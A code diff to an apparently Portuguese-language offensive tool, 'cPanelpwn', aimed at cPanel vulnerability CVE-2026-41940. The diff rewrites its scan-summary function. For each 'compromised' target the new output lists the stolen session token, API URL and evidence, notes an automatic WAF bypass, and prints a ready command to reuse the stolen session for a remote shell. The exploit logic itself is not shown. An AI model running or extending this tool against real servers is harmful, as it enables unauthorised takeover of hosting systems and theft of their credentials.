@@ -1946,32 +1946,99 @@ def scan(target: str, args, progress: Optional[Progress] = None) -> dict:
 # ══════════════════════════════════════════════════════════════
 def print_summary(elapsed: float, total: int):
     findings = STORE.all()
-    W = 70
-    print(f"\n{C.BOLD}{'═'*W}{C.RESET}", file=sys.stderr)
-    print(f"{C.BOLD}  cPanelpwn — CVE-2026-41940 Scan Complete{C.RESET}",
-          file=sys.stderr)
-    print(f"  {C.DIM}Time: {elapsed:.1f}s  ·  Targets: {total}{C.RESET}",
-          file=sys.stderr)
-    print(f"{'─'*W}", file=sys.stderr)
+    vuln_n   = len(findings)
+    clean_n  = max(0, total - vuln_n)
+    W        = 68
+
+    def p(s=""):
+        print(s, file=sys.stderr)
+
+    # ── Header ────────────────────────────────────────────────────────
+    p()
+    p(f"{C.RED}{C.BOLD}  {'═'*W}{C.RESET}")
+    p(f"{C.RED}{C.BOLD}  ██████╗██████╗  █████╗ ███╗  ██╗███████╗██╗{C.RESET}")
+    p(f"{C.RED}{C.BOLD} ██╔════╝██╔══██╗██╔══██╗████╗ ██║██╔════╝██║{C.RESET}")
+    p(f"{C.RED}{C.BOLD} ██║     ██████╔╝███████║██╔██╗██║█████╗  ██║{C.RESET}")
+    p(f"{C.RED}{C.BOLD} ██║     ██╔═══╝ ██╔══██║██║╚████║██╔══╝  ██║{C.RESET}")
+    p(f"{C.RED}{C.BOLD} ╚██████╗██║     ██║  ██║██║ ╚███║███████╗███████╗{C.RESET}")
+    p(f"{C.RED}{C.BOLD}  ╚═════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚══╝╚══════╝╚══════╝{C.RESET}")
+    p(f"{C.BOLD}  ██████╗ ██╗    ██╗███╗   ██╗{C.RESET}")
+    p(f"{C.BOLD}  ██╔══██╗██║    ██║████╗  ██║{C.RESET}")
+    p(f"{C.BOLD}  ██████╔╝██║ █╗ ██║██╔██╗ ██║{C.RESET}")
+    p(f"{C.BOLD}  ██╔═══╝ ██║███╗██║██║╚██╗██║{C.RESET}")
+    p(f"{C.BOLD}  ██║     ╚███╔███╔╝██║ ╚████║{C.RESET}")
+    p(f"{C.BOLD}  ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝{C.RESET}")
+    p(f"{C.RED}{C.BOLD}  {'═'*W}{C.RESET}")
+    p()
+
+    # ── Stats bar ─────────────────────────────────────────────────────
+    p(f"  {C.DIM}┌─ RESUMO DO SCAN {'─'*50}┐{C.RESET}")
+    p(f"  {C.DIM}│{C.RESET}  "
+      f"{C.BOLD}Escaneados{C.RESET}  {C.CYAN}{C.BOLD}{total}{C.RESET}"
+      f"     {C.BOLD}Vulneráveis{C.RESET}  {C.RED}{C.BOLD}{vuln_n}{C.RESET}"
+      f"     {C.BOLD}Limpos{C.RESET}  {C.GREEN}{C.BOLD}{clean_n}{C.RESET}"
+      f"     {C.BOLD}Tempo{C.RESET}  {C.DIM}{elapsed:.1f}s{C.RESET}")
+    p(f"  {C.DIM}└{'─'*(W+2)}┘{C.RESET}")
+    p()
+
+    # ── No findings ───────────────────────────────────────────────────
     if not findings:
-        print(f"  {C.DIM}No vulnerable targets found.{C.RESET}", file=sys.stderr)
-    else:
-        print(f"\n  {C.RED}{C.BOLD}⚡ {len(findings)} VULNERABLE TARGET(S){C.RESET}\n",
-              file=sys.stderr)
-        for f in findings:
-            print(f"  {C.RED}{C.BOLD}Target   :{C.RESET} {f['target']}",
-                  file=sys.stderr)
-            print(f"  {C.CYAN}Version  :{C.RESET} {f['version']}",
-                  file=sys.stderr)
-            print(f"  {C.CYAN}Token    :{C.RESET} {f['token']}",
-                  file=sys.stderr)
-            print(f"  {C.GREEN}API URL  :{C.RESET} {f['api_url']}",
-                  file=sys.stderr)
-            print(f"  {C.DIM}Session  : {f['session'][:45]}...{C.RESET}",
-                  file=sys.stderr)
-            ev = f.get("evidence", "")[:200].replace("\n", " ")
-            print(f"  {C.GREEN}Evidence : {ev}{C.RESET}\n", file=sys.stderr)
-    print(f"{'═'*W}{C.RESET}\n", file=sys.stderr)
+        p(f"  {C.GREEN}✔  Nenhum alvo vulnerável encontrado.{C.RESET}")
+        p()
+        return
+
+    # ── Findings count ────────────────────────────────────────────────
+    p(f"  {C.RED}{C.BOLD}{'─'*W}{C.RESET}")
+    p(f"  {C.RED}{C.BOLD}⚡  {vuln_n} ALVO(S) COMPROMETIDO(S)  —  CVE-2026-41940  —  CVSS 10.0{C.RESET}")
+    p(f"  {C.RED}{C.BOLD}{'─'*W}{C.RESET}")
+    p()
+
+    # ── Per-finding cards ─────────────────────────────────────────────
+    for idx, f in enumerate(findings, 1):
+        version = f.get("version", "unknown")
+        patched = is_version_patched(version)
+        waf     = f.get("waf", "")
+        ev      = f.get("evidence", "")[:180].replace("\n", " ").strip()
+        ts      = f.get("timestamp", "")[:19].replace("T", " ")
+        session = f.get("session", "")
+        token   = f.get("token", "")
+        target  = f.get("target", "")
+        api_url = f.get("api_url", "")
+
+        # Version badge
+        if patched is False:
+            ver_str = f"{C.RED}{C.BOLD}{version}  ◀ VULNERÁVEL{C.RESET}"
+        elif patched is True:
+            ver_str = f"{C.YELLOW}{version}  ◀ patch detectado — verificar{C.RESET}"
+        else:
+            ver_str = f"{C.CYAN}{version}{C.RESET}"
+
+        sep = f"  {C.RED}{C.BOLD}│{C.RESET}"
+        p(f"  {C.RED}{C.BOLD}┌─ #{idx} {'─'*(W-5)}{C.RESET}")
+        p(f"{sep}  {C.DIM}{'TARGET':10}{C.RESET}  {C.BOLD}{C.CYAN}{target}{C.RESET}")
+        p(f"{sep}  {C.DIM}{'VERSÃO':10}{C.RESET}  {ver_str}")
+        if waf:
+            p(f"{sep}  {C.DIM}{'WAF':10}{C.RESET}  {C.ORANGE}{C.BOLD}{waf}{C.RESET}  "
+              f"{C.DIM}(bypass aplicado automaticamente){C.RESET}")
+        p(f"{sep}  {C.DIM}{'TOKEN':10}{C.RESET}  {C.GREEN}{C.BOLD}{token}{C.RESET}")
+        p(f"{sep}  {C.DIM}{'SESSÃO':10}{C.RESET}  {C.DIM}{session[:55]}...{C.RESET}")
+        p(f"{sep}  {C.DIM}{'API URL':10}{C.RESET}  {C.GREEN}{api_url}{C.RESET}")
+        if ts:
+            p(f"{sep}  {C.DIM}{'QUANDO':10}{C.RESET}  {C.DIM}{ts}{C.RESET}")
+        p(sep)
+        if ev:
+            p(f"{sep}  {C.DIM}{'EVIDÊNCIA':10}{C.RESET}  {C.GREEN}{ev}{C.RESET}")
+            p(sep)
+        reuse = (f"python3 cPanelpwn.py -u {target} "
+                 f"--session '{session[:25]}...' "
+                 f"--token {token} --action shell")
+        p(f"{sep}  {C.DIM}{'REUSO ▶':10}{C.RESET}  {C.DIM}{reuse}{C.RESET}")
+        p(f"  {C.RED}{C.BOLD}└{'─'*W}{C.RESET}")
+        p()
+
+    # ── Footer ────────────────────────────────────────────────────────
+    p(f"  {C.RED}{C.BOLD}{'═'*W}{C.RESET}")
+    p()
 
 # ══════════════════════════════════════════════════════════════
 #  HTML REPORT
